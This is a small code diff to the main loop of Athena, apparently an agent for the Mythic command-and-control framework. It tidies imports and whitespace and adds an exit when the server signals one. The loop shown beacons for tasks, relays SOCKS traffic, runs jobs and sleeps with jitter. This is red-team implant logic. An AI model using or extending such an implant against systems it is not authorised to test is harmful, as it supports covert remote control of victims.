@@ -1,13 +1,10 @@
-﻿using Athena.Commands;
-using Athena.Utilities;
+﻿using System;
 using System.Collections.Generic;
-using System.Threading;
 using System.Threading.Tasks;
-using System;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Tasks;
 using Athena.Models.Mythic.Response;
-using System.Runtime.InteropServices;
+using Athena.Utilities;
 
 namespace Athena
 {
@@ -76,8 +73,12 @@ namespace Athena
                     List<SocksMessage> socksMessages = socksTask.Result;
                     List<object> responses = responsesTask.Result;
 
-
                     List<MythicTask> tasks = await mc.GetTasks(responses, delegateMessages, socksMessages);
+
+                    if (mc.exit)
+                    {
+                        Environment.Exit(0);
+                    }
 
                     if(tasks is null)
                     {
@@ -85,10 +86,8 @@ namespace Athena
                         {
                             Environment.Exit(0);
                         }
-
                         //Return responses to waiting queue
                         await mc.commandHandler.AddResponse(responses);
-
                         missedCheckins++;
                     }
                     else
@@ -97,7 +96,6 @@ namespace Athena
                         {
                             Task.Run(() => mc.commandHandler.StartJob(c));
                         });
-
                     }
                 }
                 catch (Exception e)
@@ -111,7 +109,5 @@ namespace Athena
                 await Task.Delay(await Misc.GetSleep(mc.MythicConfig.sleep, mc.MythicConfig.jitter) * 1000);
             }
         }
-
-
     }
 }
